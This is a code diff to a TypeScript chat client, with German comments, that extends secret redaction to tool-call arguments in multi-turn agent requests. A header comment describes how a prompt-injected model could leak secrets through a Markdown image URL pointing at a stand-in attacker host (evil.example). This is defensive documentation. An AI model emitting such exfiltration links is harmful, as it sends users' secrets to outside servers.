@@ -1,4 +1,4 @@
-// vendored from obsidian-kit@0.51.1, src/obsidian/chat-client.ts — do not hand-edit; re-vendor via tools/sync-kit.sh
+// vendored from obsidian-kit@0.51.2, src/obsidian/chat-client.ts — do not hand-edit; re-vendor via tools/sync-kit.sh
 /** Ein Chat-Aufruf gegen `/v1/chat/completions` (OpenAI-kompatibel) — Streaming, Tool-Calls,
  *  Abbruch, Idle-Timeout, Fehlerbody, Fallback ohne Stream. Kein `obsidian`-Import: der Transport
  *  wird injiziert (`chat-transport.ts` liefert XHR und `requestUrl`), die Uhr ebenso. Damit ist
@@ -52,8 +52,9 @@
  *  prompt-injiziertes Modell kann ihn in eine Bild-URL schreiben (`![x](https://evil.example/?d=[…])`).
  *  `stable-writer` neutralisiert deshalb vor dem Rendern (Bilder werden Text, `<` wird `&lt;`);
  *  eigene Render-Wege rufen `neutralizeModelMarkdown`. Ein klickbarer Link bleibt möglich — eine
- *  dokumentierte Restgrenze, kein Auto-Abfluss. (3) `tool_calls[].function.arguments` in den
- *  GESENDETEN Nachrichten (frühere Assistenten-Runden) werden nicht geschwärzt. (4) Eigene Regeln
+ *  dokumentierte Restgrenze, kein Auto-Abfluss. (3) Auch die GESENDETEN `tool_calls[].function.arguments` (frühere Assistenten-Runden) laufen durch die Session: bekannte
+ *  Originale in Roh- und JSON-escapter Form, Unbekanntes über die Muster, das Argument bleibt gültiges JSON — sonst
+ *  trüge Runde 2 eines Agenten-Verlaufs das restaurierte Original im Klartext zurück zum Server. (4) Eigene Regeln
  *  dürfen keine Platzhalter treffen (siehe `redact`). (5) Ein Bearer-Treffer ersetzt den ganzen
  *  Ausdruck samt dem Wort „Bearer“. `redactions` zählt verschiedene Werte, nicht Vorkommen.
  *  `redact: false` schaltet alles ab. */
@@ -108,6 +109,12 @@ export interface ChatRequest {
   /** Feuert einmal je Tool-Call, sobald sein Name feststeht — für die Statuszeile, bevor die
    *  Stille der gepufferten Argumente beginnt. */
   onToolCallHead?: (name: string) => void;
+  /** Wie `content` restauriert wird: `"text"` (Default) setzt Originale roh ein; `"json"` setzt sie
+   *  JSON-maskiert ein (Zeilenumbruch → `\\n`), damit ein Platzhalter in einem JSON-String — ein mehrzeiliger PEM
+   *  — gültiges JSON bleibt. Für Konsumenten, die JSON aus `content` parsen. Gilt für `content` und `partial` im
+   *  Ergebnis; `onToken` und `onReasoning` liefern weiter Anzeigetext, `content` ist bei `"json"` also NICHT die
+   *  Verkettung der Token. */
+  restoreContent?: "text" | "json";
 }
 
 export interface ToolCall { id: string; name: string; arguments: string }
@@ -210,7 +217,9 @@ function namedErrorName(e: unknown): string {
   return e instanceof Error ? e.name : "";
 }
 
-type RedactTarget = Pick<RedactionSession, "redact">;
+type RedactTarget = Pick<RedactionSession, "redact" | "restore">;
+
+const PLACEHOLDER_RE = /\[redacted-[a-z0-9-]+-\d+\]/g;
 
 function redactContent(content: unknown, session: RedactTarget): unknown {
   if (typeof content === "string") return session.redact(content);
@@ -219,14 +228,59 @@ function redactContent(content: unknown, session: RedactTarget): unknown {
     isRecord(part) && part.type === "text" && typeof part.text === "string" ? { ...part, text: session.redact(part.text) } : part);
 }
 
+/** Argument-JSON eines gesendeten Tool-Calls: erst die BEKANNTEN Originale (Platzhalter aus den
+ *  Texten dieses Aufrufs) in Roh- UND JSON-escapter Form durch ihren Platzhalter ersetzen — ein Original mit
+ *  Zeilenumbruch, `"` oder `\` steht im Argument-JSON maskiert, die Rohsuche fände es nie —, dann die
+ *  Muster für Unbekanntes. Das Ergebnis bleibt gültiges JSON (sonst wird es als Zeichenkette verpackt). */
+function redactArguments(args: string, known: ReadonlySet<string>, session: RedactTarget): string {
+  const needles: Array<[string, string]> = [];
+  for (const ph of known) {
+    const original = session.restore(ph);
+    if (original === ph || original === "") continue;
+    const escaped = JSON.stringify(original).slice(1, -1);
+    needles.push([escaped, ph]);
+    if (escaped !== original) needles.push([original, ph]);
+  }
+  needles.sort((a, b) => b[0].length - a[0].length);
+  let out = args;
+  for (const [needle, ph] of needles) out = out.split(needle).join(ph);
+  out = session.redact(out);
+  try { JSON.parse(args); } catch { return out; }   // war schon kein JSON: nichts zu bewahren
+  try { JSON.parse(out); return out; } catch { return JSON.stringify({ redacted: out }); }
+}
+
+function redactToolCalls(toolCalls: unknown, known: ReadonlySet<string>, session: RedactTarget): unknown {
+  if (!Array.isArray(toolCalls)) return toolCalls;
+  return toolCalls.map((tc: unknown) => {
+    if (!isRecord(tc) || !isRecord(tc.function)) return tc;
+    const args = tc.function.arguments;
+    if (typeof args === "string") return { ...tc, function: { ...tc.function, arguments: redactArguments(args, known, session) } };
+    if (isRecord(args)) return { ...tc, function: { ...tc.function, arguments: JSON.parse(redactArguments(JSON.stringify(args), known, session)) as unknown } };
+    return tc;
+  });
+}
+
 function redactWith(messages: readonly ChatWireMessage[], session: RedactTarget): ChatWireMessage[] {
-  return messages.map((m) => ({ ...m, content: redactContent(m.content, session) }));
+  // Durchgang 1: die Texte; die ausgegebenen Platzhalter sind die bekannten Originale dieses Aufrufs.
+  const known = new Set<string>();
+  const texts = messages.map((m) => {
+    const content = redactContent(m.content, session);
+    const flat = typeof content === "string" ? content : JSON.stringify(content) ?? "";
+    for (const ph of flat.match(PLACEHOLDER_RE) ?? []) known.add(ph);
+    return content;
+  });
+  // Durchgang 2: gesendete Tool-Call-Argumente (Runde 2 eines Agenten-Verlaufs trägt das Original sonst im Klartext).
+  return messages.map((m, i) => {
+    const out: ChatWireMessage = { ...m, content: texts[i] };
+    if (m.tool_calls !== undefined) out.tool_calls = redactToolCalls(m.tool_calls, known, session);
+    return out;
+  });
 }
 
 /** Die Schwärzung des Clients als eigene Funktion — damit eine Vorschau den GESENDETEN Text zeigen
  *  kann (image-to-markdown, vault-rag) samt Zahl für die Zeile „N Stellen geschwärzt“. Gibt Kopien
  *  zurück, die Eingabe bleibt unverändert; gleicher Wert → gleicher Platzhalter. Umfang und Grenzen
- *  wie im Kopfkommentar (Text-Teile aller Rollen; `tool_calls` und Bildteile nicht). */
+ *  wie im Kopfkommentar (Text-Teile aller Rollen und gesendete Tool-Argumente; Bildteile nicht). */
 export function redactMessages<M extends ChatWireMessage>(messages: readonly M[], rules: RedactRules = DEFAULT_REDACT_RULES): { messages: M[]; count: number } {
   const session = createRedactionSession(rules);
   const out = redactWith(messages, session) as M[];
@@ -307,9 +361,10 @@ export function createChatClient(opts: ChatClientOptions): ChatClient {
     let content = "";
     let reasoning = "";
     const back = (t: string): string => (session ? session.restore(t) : t);
+    const backContent = (t: string): string => (session && req.restoreContent === "json" ? restoreInJson(session, t) : back(t));
     const redactions = session?.count ?? 0;
     const fail = (kind: ChatErrorKind, detail: string, extra: { status?: number; body?: string } = {}): ChatResult =>
-      ({ ok: false, kind, detail, partial: back(content), reasoning: back(reasoning), ...extra, timing: timing(), redactions });
+      ({ ok: false, kind, detail, partial: backContent(content), reasoning: back(reasoning), ...extra, timing: timing(), redactions });
 
     if (req.signal?.aborted) return fail("aborted", "aborted before start");
 
@@ -448,7 +503,7 @@ export function createChatClient(opts: ChatClientOptions): ChatClient {
 
     return {
       ok: true,
-      content: back(content),
+      content: backContent(content),
       reasoning: back(reasoning),
       toolCalls: session ? toolCalls.map((t) => ({ ...t, arguments: restoreInJson(session, t.arguments) })) : toolCalls,
       ...(finishReason !== undefined ? { finishReason } : {}),
